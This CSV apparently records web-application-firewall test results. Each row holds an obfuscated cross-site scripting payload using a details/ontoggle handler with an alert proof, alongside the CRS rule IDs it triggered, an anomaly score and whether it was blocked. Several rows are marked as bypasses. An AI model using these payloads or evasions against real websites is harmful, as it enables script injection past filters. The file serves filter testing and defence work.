index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
616,"<details open ontoggle=""(function(){return this})()['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,block,5,"933210,934100,941100,941120,949110","o24,77v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826498967.247266
617,"<details open ontoggle=""parent['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o30,50v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826499162.540357
618,"<details open ontoggle=""frames['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o30,50v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826499353.503907
621,"<details open ontoggle=""document['defaultView']['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o32,65v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,23v217,99t:urlDecodeUni,t:compressWhitespace || ",20,17782649995.178071
624,"<details open ontoggle=""top['Function']('al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o27,29v217,58t:urlDecode,t:replaceComments,t:compressWhitespace || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,58t:urlDecodeUni,t:compressWhitespace || ",20,177826500597.802005
625,"<details open ontoggle=""window['Function']('al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o30,29v217,61t:urlDecode,t:replaceComments,t:compressWhitespace || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,18v217,61t:urlDecodeUni,t:compressWhitespace || ",20,177826500821.775957
627,"<details open ontoggle=""parent['Function']('al'+'ert(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o30,29v217,61t:urlDecode,t:replaceComments,t:compressWhitespace || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826501283.977424
635,"<details open ontoggle=""Function(String.fromCharCode(97,108,101,114,116,40,49,41))()"">",0,1,block,4,"934100,941100,941120,949110","o33,19v217,86 || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826502812.745023
637,"<details open ontoggle=""globalThis['Function']('al'+'ert(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o34,29v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17782650337.071066
639,"<details open ontoggle=""new Function('al'+'ert(1)')()"">",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v216,55 || o24,13v216,55t:urlDecodeUni || v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826503713.757187
645,"<details open ontoggle=""top['Function']('al'+'ert(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o27,29v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,68t:urlDecodeUni,t:compressWhitespace || ",20,177826504949.441923
658,"<details open ontoggle=""new Function('al'+'ert(1)')()""></details>",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,65 || o24,13v217,65t:urlDecodeUni || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826507772.349166
662,"<details open ontoggle=""[].constructor.constructor('ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826508636.796205
666,"<details open ontoggle=""window['Function']('ale'+'rt(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o30,29v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,18v217,71t:urlDecodeUni,t:compressWhitespace || ",20,177826509468.982753
670,"<details open ontoggle=""globalThis.Function('ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826510262.141423
671,"<details open ontoggle=""Reflect.construct(Function,['ale'+'rt(1)'])()""></details>",0,1,bypass,2,"941100,941120","v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826510586.389146
672,"<details open ontoggle=""[]['constructor']['constructor']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o24,49v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826510713.773920
673,"<details open ontoggle=""(new/**/Function('ale'+'rt(1)'))()""></details>",0,1,bypass,2,"941100,941120","v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826510961.078843
675,"<details open ontoggle=""''['constructor']['constructor']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o26,47v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826511329.819854
677,"<details open ontoggle=""parent.Function('ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826511757.524629
678,"<details open ontoggle=""top.Function.prototype.constructor('ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826512030.043874
680,"<details open ontoggle=""with(this)Function('ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826512416.590889
693,"<details open ontoggle=""top['co'+'nstru'+'ctor']['co'+'nstru'+'ctor']('retu'+'rn ev'+'al')()('ale'+'rt(1)')"">",0,1,block,5,"933210,941100,941120,941370,949110","o27,80v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,24v217,109t:urlDecodeUni,t:compressWhitespace || ",20,177826515152.152883
702,"<details open ontoggle=""(function(){return this})()['ev'+'al'](atob('YWxlcnQoMSk='))"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,60v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,86 || o25,11v217,86t:urlDecodeUni || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826517165.759814
716,"<details open ontoggle=""Function['prototype']['constructor']('return\x20eval')().call(null,atob('YWxlcnQoMSk='))"">",0,1,block,4,"933210,941100,941120,949110","o32,80v217,114t:urlDecode,t:replaceComments,t:compressWhitespace || v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826520090.047978
723,"<details open ontoggle=""top['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o27,50v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,89t:urlDecodeUni,t:compressWhitespace || ",20,177826521564.671607
726,"<details open ontoggle=""(0,window['Function'])('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o33,51v217,96t:urlDecode,t:replaceComments,t:compressWhitespace || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o27,18v217,96t:urlDecodeUni,t:compressWhitespace || ",20,177826522213.584874
727,"<details open ontoggle=""parent['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o30,50v217,92t:urlDecode,t:replaceComments,t:compressWhitespace || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826522491.855974
728,"<details open ontoggle=""self['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o28,50v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,16v217,90t:urlDecodeUni,t:compressWhitespace || ",20,177826522614.151575
729,"<details open ontoggle=""globalThis['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o34,50v217,96t:urlDecode,t:replaceComments,t:compressWhitespace || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17782652284.223474
731,"<details open ontoggle=""(0,top.Function)('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826523379.485938
735,"<details open ontoggle=""Reflect.get(window,'Function')('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826524186.338313
738,"<details open ontoggle=""(0,window.Function).apply(null,['&#97;&#108;&#101;&#114;&#116;(1)'])()""></details>",0,1,bypass,2,"941100,941120","v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826524866.119819
740,"<details open ontoggle=""(0,Object.getPrototypeOf(async function(){}).constructor)('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,block,5,"933210,934100,941100,941120,949110","o48,71v217,131t:urlDecode,t:replaceComments,t:compressWhitespace || o55,11v217,131 || v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826525298.859186
748,"<details open ontoggle=""(function(){return this})()['Function']('\x61\x6c\x65\x72\x74(29)')()""></details>",0,1,block,5,"933210,934100,941100,941120,949110","o24,69v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,105 || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826526854.921883
762,"<details open ontoggle=""self['Function']('al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o28,29v217,59t:urlDecode,t:replaceComments,t:compressWhitespace || v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,16v217,59t:urlDecodeUni,t:compressWhitespace || ",20,177826529927.580642
763,"<details open ontoggle=""frames['Function']('al'+'ert(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o30,29v217,61t:urlDecode,t:replaceComments,t:compressWhitespace || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826530142.469171
765,"<details open ontoggle=""(0,window['Function'])('al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o33,30v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o27,18v217,65t:urlDecodeUni,t:compressWhitespace || ",20,177826530512.903083
772,"<details open ontoggle=""(function(){}).__proto__.constructor('al'+'ert(1)')()"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,79 || o25,11v217,79t:urlDecodeUni || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826532091.135379
779,"<details open ontoggle=""[]['filter']['constructor']('ale'+'rt(15)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o24,45v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17782653365.276908
781,"<details open ontoggle=""(1,window['Function'])('al'+'ert(15)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o33,31v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o27,18v217,76t:urlDecodeUni,t:compressWhitespace || ",20,177826534086.241550
783,"<details open ontoggle=""parent.Function('al'+'ert(15)')()""></details>",0,1,bypass,2,"941100,941120","v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826534494.761308
786,"<details open ontoggle=""globalThis.Function('al'+'ert(15)')()""></details>",0,1,bypass,2,"941100,941120","v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826535029.972116
798,"<details open ontoggle=""top['Function']('al'+String.fromCharCode(101)+'rt(1)')()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o27,53v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o45,19v217,82 || o45,19v217,82t:urlDecodeUni || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,82t:urlDecodeUni,t:compressWhitespace || ",30,177826537669.653333
799,"<details open ontoggle=""window['Function']('al'+String.fromCharCode(101)+'rt(1)')()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o30,53v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || o48,19v217,85 || o48,19v217,85t:urlDecodeUni || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,18v217,85t:urlDecodeUni,t:compressWhitespace || ",30,177826537844.611214
804,"<details open ontoggle=""(function(){})['constructor']('al'+'\x65'+'rt(1)')()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,52v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,78 || o25,11v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826538970.199838
806,"<details open ontoggle=""Reflect.construct(Function,[`al`+`ert(1)`])()"">",0,1,bypass,2,"941100,941120","v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826539317.329402
815,"<details open ontoggle=""top['Function']('ale'+'rt(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o27,29v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,68t:urlDecodeUni,t:compressWhitespace || ",20,17782654123.715368
